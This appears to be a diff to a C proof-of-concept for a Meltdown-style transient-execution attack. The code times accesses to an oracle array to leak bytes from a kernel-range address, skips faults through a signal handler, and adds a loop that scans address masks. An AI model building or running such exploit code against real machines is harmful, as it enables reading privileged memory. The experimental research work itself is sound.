@@ -79,17 +79,14 @@ static inline void memaccess(void* p){
 }
 
 void __attribute__((optimize("-Os")))void_operations3(volatile char* a, volatile unsigned char* b){
-    addr1[offset ] = 0xe1; //  sender
+    addr1[offset ] = 0xf1; //  sender
     asm volatile("mfence");
     //read(tlb_fd, addr1, 0x0);
     //addr1[offset+128] = 0xfc;
     // oraclearr[PG_SIZE * addr3[offset]];
-    for(int i = 0; i < 20; ++i) sched_yield();
-    asm volatile("mfence");
     oraclearr[PG_SIZE * addr3[offset]];
     oraclearr[PG_SIZE * addr3[offset]]; // 0xfa
     oraclearr[PG_SIZE * addr2[offset]]; // receiver; addr2 - not valid address
-    oraclearr[PG_SIZE * addr2[offset]];
 };
 
 void void_operations2(int64_t *a, int64_t *b){
@@ -130,16 +127,17 @@ uint64_t time_access(volatile void* add){
 
 static void handler(int signum, siginfo_t *si, void* arg){
     ucontext_t *ucon = (ucontext_t*)arg;
-    printf("SIGHANDLER\n");
+    //printf("SIGHANDLER\n");
     // printf("SEGFAULT CODE LETS TEST FIRST BYTE %p\n", ucon->uc_mcontext.gregs[REG_RIP]);
-    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 19;//17;
+    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 21;//17;
 }
 
 
-int  __attribute__((optimize("-O0")))main(void){
+int  __attribute__((optimize("-O0")))main(int argc, char** argv){
     register char loaded_val;
     volatile char *f;
     int64_t a = 100000000,b = 100;
+    void* addr2s;
     struct sigaction sa;
     cpu_set_t my_set;
     sa.sa_handler = (void (*)(int))handler;
@@ -149,7 +147,8 @@ int  __attribute__((optimize("-O0")))main(void){
 
     addr1 = (char*)(((uint64_t)malloc(20*PG_SIZE) + 4096) & ~0xFFF );
     addr3 = (char*)(((uint64_t)malloc(20*PG_SIZE) + 4096) & ~0xFFF );
-    addr2 = (volatile char*)(((uint64_t)addr1) & 0xffffffffffffffff  | 0xffff000000000000); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
+    addr2 = (volatile char*)((((uint64_t)addr1) & 0xffffffffffffffff  | 0xffff000000000000 ) ); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
+    addr2s = addr2;
     printf("addr1[%p] : addr2[%p]\n",addr1, addr2);
     addr1[offset] = 0xe3;
     asm volatile("mfence");
@@ -163,11 +162,12 @@ int  __attribute__((optimize("-O0")))main(void){
     tmp_store = malloc(sizeof(unsigned));
     addr3[offset] = 0xfa;
     pthread_t thread;
-
+    uint64_t mask_c = 0x0000;
 //    pthread_create(&thread, NULL, sibl_thread, NULL);
     // EVERYTHING IS INITIALIZED
 experiments_:
-    printf("Running experiments\n");
+    addr2 = (volatile char*)((uint64_t)addr2s ^ mask_c);
+    //printf("Running experiments\n");
     memset(averg_rnd, 0x0, 256*sizeof(int64_t));
     memset(averg, 0x0, 256*sizeof(uint64_t));
     memset(oraclearr, 0xe0, sizeof(char) * PG_SIZE*256);
@@ -219,14 +219,24 @@ experiments_:
         if(averg_rnd[i] < winner_min){
             winner_min = averg_rnd[i];
         }
-	    printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
+	    //printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
     }
     if( (winner_max - winner_min) < (NUM_ROUNDS/3)) {
-        printf("Not egnough confidence\n");
+        //printf("Not egnough confidence\n");
         goto experiments_;
+    }
+    if(averg_rnd[0xf1] >= 2){
+    	printf("\nPOssible candidate of the mask %p, with weight %d\n",mask_c, averg_rnd[0xf1]);
+    } else {
+    	printf("\r trying mask %p", mask_c);
+    }
+    if(mask_c <= (0x1ULL << 48)){
+	   mask_c += 0x1000;
+	   goto experiments_;
     }
     printf("ADRESSES WERE [%p] vs [%p] : %p\n", &addr1[offset], &addr2[offset], 0xffff9a433f79b000);
     printf("Winner is 0x%02x [%c]\n", winner, winner);
+    printf("MASK %p\n", mask_c);
     return 1;
 }
 
